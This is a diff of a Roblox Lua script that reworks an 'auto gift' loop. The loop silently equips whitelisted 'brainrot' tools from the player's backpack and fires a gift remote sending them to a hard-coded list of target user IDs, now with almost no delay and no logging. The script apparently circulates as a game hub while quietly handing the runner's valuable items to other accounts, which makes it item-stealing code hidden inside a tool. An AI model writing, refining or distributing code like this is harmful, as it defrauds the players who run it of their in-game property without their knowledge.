@@ -28,8 +28,7 @@ local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-H
 
 local isGoodServer = false
 local animBlocked = false
-local cachedTools = {}
-local cacheBuilt = false
+
 --====================================================
 -- QUEUE
 --====================================================
@@ -763,117 +762,28 @@ end)
 -- AUTO GIFT LOOP
 --====================================================
 
---====================================================
--- AUTO GIFT HYBRID (SCAN + GIFT LANGSUNG)
---====================================================
-
-local cachedTools = {}
-local scanned = {}
-local scanDone = false
-
---====================================================
--- ADD TO CACHE (ANTI DUPLICATE)
---====================================================
-local function addToCache(tool, chance)
-    if scanned[tool] then return end
-    scanned[tool] = true
-
-    table.insert(cachedTools, {
-        tool = tool,
-        chance = chance or 0
-    })
-end
-
---====================================================
--- SORT CACHE
---====================================================
-local function sortCache()
-    table.sort(cachedTools, function(a,b)
-        return a.chance < b.chance
-    end)
-end
-
---====================================================
--- MAIN LOOP
---====================================================
 task.spawn(function()
     while true do
+        for _,tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool")
+            and tool.Parent == backpack
+            and not isWeightTool(tool) then
 
-        --====================================
-        -- 🔥 PHASE 1: SCAN + LANGSUNG GIFT
-        --====================================
-        if not scanDone then
-            local foundNew = false
+                -- 🔥 equip dulu
+                silentEquip(tool)
 
-            for _,tool in ipairs(backpack:GetChildren()) do
-                if tool:IsA("Tool")
-                and tool.Parent == backpack
-                and not isWeightTool(tool)
-                and brainrotWhitelist[tool.Name]
-                and not scanned[tool] then
-
-                    foundNew = true
-
-                    -- 🔥 equip buat load attr
-                    silentEquip(tool)
-                    task.wait(0.15)
-
-                    local mutation = getMutation(tool)
-                    local data = brainrotWhitelist[tool.Name]
-
-                    local allowed = false
-                    if data then
-                        if data.mutations["*"] then
-                            allowed = true
-                        else
-                            allowed = data.mutations[mutation] == true
-                        end
+                -- 🔥 cek whitelist + mutation
+                if isWhitelisted(tool) then
+                    for _,id in ipairs(targetUserIds) do
+                        giftRemote:FireServer(id)
                     end
-
-                    if allowed then
-                        addToCache(tool, data.chance)
-
-                        local target = targetUserIds[1]
-                        print("SCAN+GIFT:", tool.Name, "|", mutation)
-
-                        task.wait(0.1)
-                        giftRemote:FireServer(target, tool.Name)
-                    end
-
-                    tool.Parent = backpack
-                    task.wait(0.05)
                 end
-            end
 
-            -- kalau ga nemu tool baru → scan selesai
-            if not foundNew then
-                sortCache()
-                scanDone = true
-                print("SCAN DONE ✅ TOTAL CACHE:", #cachedTools)
-            end
-
-        --====================================
-        -- ⚡ PHASE 2: LOOP GIFT DARI CACHE
-        --====================================
-        else
-            for _,data in ipairs(cachedTools) do
-                local tool = data.tool
-
-                if tool and tool.Parent == backpack then
-                    silentEquip(tool)
-                    task.wait(0.2)
-
-                    local target = targetUserIds[1]
-                    print("CACHE GIFT:", tool.Name)
-
-                    giftRemote:FireServer(target, tool.Name)
-
-                    task.wait(0.3)
-                    tool.Parent = backpack
-                end
+                -- 🔥 langsung balikin (no delay lama)
+                tool.Parent = backpack
             end
         end
 
-        task.wait(0.2)
+        task.wait(0.005) -- yield tipis biar gak freeze
     end
 end)
